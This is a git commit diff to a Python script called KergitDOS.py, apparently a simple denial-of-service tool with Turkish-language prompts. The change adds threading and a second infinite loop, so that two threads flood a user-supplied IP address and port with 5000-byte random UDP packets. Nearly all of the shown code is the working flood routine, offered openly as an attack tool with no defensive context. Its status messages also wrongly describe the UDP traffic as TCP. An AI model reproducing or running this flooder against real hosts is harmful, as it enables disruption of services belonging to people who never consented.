55f6a13413c1d05616215b7e61ab5627e011f62f
kayra <94867695+kayrakrgt@users.noreply.github.com>
2025-01-20 16:49:57 +0300

    Update KergitDOS.py

--- KergitDOS.py
+++ KergitDOS.py
@@ -1,4 +1,4 @@
-import socket , requests , random , colorama
+import socket , requests , random , colorama , threading
 from colorama import init , Fore
 init()
 
@@ -20,13 +20,13 @@ banner = """
 
 print(Fore.LIGHTMAGENTA_EX+banner)
 print(Fore.LIGHTCYAN_EX)
-
+ip = input("IP Adresi giriniz>>>")
+port = int(input("Port giriniz>>>"))
 
 def udp():
    sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    sock.settimeout(5)
-   ip = input("IP Adresi giriniz>>>")
-   port = int(input("Port giriniz>>>"))
+   
    try:
          print("IP Adresi bulundu! TCP paketleri gönderiliyor!!!")
          while True:
@@ -38,10 +38,32 @@ def udp():
               print("Paket Gönderilemedi!")
    except Exception:
            print("ip adresi bulunamadı")
+   except KeyboardInterrupt:
+           print("CTRL C İLE PROGRAM DURDURULDU")
+def udp2():
+   sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+   sock.settimeout(5)
+   
+   try:
+         print("IP Adresi bulundu! TCP paketleri gönderiliyor!!!")
+         while True:
+          try:
+           rand = random._urandom(5000)
+           sock.sendto(rand, (ip,port))
+           print("paket gönderildi!!!")  
+          except Exception:
+              print("Paket Gönderilemedi!")
+   except Exception:
+           print("ip adresi bulunamadı")
+   except KeyboardInterrupt:
+           print("CTRL C İLE PROGRAM DURDURULDU")
+thread1 = threading.Thread(target=udp)
+thread1.start()
+thread2 = threading.Thread(target=udp2)
+thread2.start()
 
 
 
-enter = input("entere basınız")
-udp()
+
 
 
